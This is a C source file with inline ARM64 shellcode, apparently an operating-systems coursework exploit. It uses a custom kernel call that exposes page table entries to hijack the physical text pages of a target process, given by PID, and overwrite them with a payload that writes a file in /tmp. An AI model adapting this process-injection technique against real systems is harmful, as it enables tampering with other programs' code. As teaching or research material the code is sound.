#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "expose_pte.h"

/* O_CREAT is 0100 */
/* O_RDWR is 2 */
/* O_CREAT | O_RDWR is 0102 = 66 */
/* 0644 is 420 */
/* / is 0x2F, t is 0x74, m is 0x6D, p is 0x70 */
/* a is 0x61, b is 0x62, c is 0x63, . is 0x2E */
/* t is 0x74, x is 0x78 */
/* /tmp/abc.txt\0 = 2F746D702F616263 2E74787400000000 */
/* push 0x7478742E, then push 6362612F706D742F */
/* openat is 56, write is 64, */

extern void write_tmp();
__asm__(".global write_tmp\n"
	"write_tmp:\n\t"
	"mov x15, #0x742E\n\t"
	"movk x15, #0x7478, lsl #16\n\t"
	"mov x14, #0x742F\n\t"
	"movk x14, #0x706D, lsl #16\n\t"
	"movk x14, #0x612F, lsl #32\n\t"
	"movk x14, #0x6362, lsl #48\n\t"
	"stp x14, x15, [sp, #-16]!\n\t"
	"mov x0, xzr\n\t"
	"mov x1, sp\n\t"
	"mov x2, #66\n\t"
	"mov x3, #420\n\t"
	"mov x8, #56\n\t"
	"svc #0\n\t"
	"mov x16, #0x6968\n\t"
	"str x16, [sp, #-8]!\n\t"
	"mov x1, sp\n\t"
	"mov x2, #2\n\t"
	"mov x8, #64\n\t"
	"svc #0\n\t"
	"loop:\n\t"
	"mov x0, x0\n\t"
	"b loop\n\t");

/* argv[0], pid, text seg start va, text seg end va */
/* 1. remember all pte entries */
/* 2. make the entire text seg point to a physical loop page, loop in moddle */
/* 3. map the original text seg pages (the memorized ptes) onto us (loop va) and modify them with write_tmp */
/* 4. put pack all the pte entries */

struct pte_entry_info {
	unsigned long *ptep;
	unsigned long pte;
	int index;
};

int main(int argc, char **argv)
{
	unsigned long text_seg_start_va, text_seg_end_va, curr_va, pte_loop;
	int text_seg_pages, loop_pte_index;
	unsigned long i, j;
	unsigned long *ptep_exploit;
	struct pte_entry_info *info;
	void *loop;

	if (argc != 4) {
		printf("Usage %s pid text_seg_start_va text_seg_end_va\n", argv[0]);
		exit(-1);
	}

	loop = mmap(NULL, 1 << 12, PROT_READ | PROT_WRITE | PROT_EXEC, 
			MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (!loop) {
		printf("allocate error\n");
		exit(-1);
	}

	/* loop backs to the middle of the page */
	for (i = 0; i < 1 << 10; i++)
		((int*)loop)[i] = 0xd503201f;
	for (i = 511; i < 1 << 10; i++)
		((int*)loop)[i] = 0x17ffffff - (i - 511);
	// Expose loop's pte
	loop_pte_index = ((unsigned long)loop >> 12) % 512;
	ptep_exploit = expose_pte_single(getpid(), (unsigned long)loop);
	pte_loop = ptep_exploit[loop_pte_index];

	text_seg_start_va = (unsigned long)strtol(argv[2], NULL, 16);
	text_seg_end_va = (unsigned long)strtol(argv[3], NULL, 16);
	// number of text segment pages
	text_seg_pages = (text_seg_end_va - text_seg_start_va) >> 12;
	printf("page count: %d\n", text_seg_pages);
	// array of pte_entry_info
	info = (struct pte_entry_info *)calloc(text_seg_pages, sizeof(struct pte_entry_info));

	// save every entry and point every entry to the loop page
	for (i = 0; i < text_seg_pages; i++) {
		curr_va = text_seg_start_va + (i << 12);
		printf("curr_va: %lx\n", curr_va);
		info[i].index = (curr_va >> 12) % 512;
		info[i].ptep = expose_pte_single(atoi(argv[1]), curr_va);
		printf("ptep: %p\n", info[i].ptep);
		info[i].pte = (info[i].ptep)[info[i].index];
		printf("entry: %lx\n", info[i].pte);
		(info[i].ptep)[info[i].index] = pte_loop;
	}

	// write every text segment physical page with payload
	for (i = 0; i < text_seg_pages; i++) {
		// map physical page to loop va with write access
		ptep_exploit[loop_pte_index] = info[i].pte & 0xffffffffffffff7f;
		for (j = 0; j < 1 << 10; j++)
			((int*)loop)[j] = 0xd503201f;
		memcpy(loop + (1 << 12) - 84, &write_tmp, 84);
		// map "sheep"'s physical pages back
		(info[i].ptep)[info[i].index] = info[i].pte;
	}

	ptep_exploit[loop_pte_index] = pte_loop;

	return 0;
}
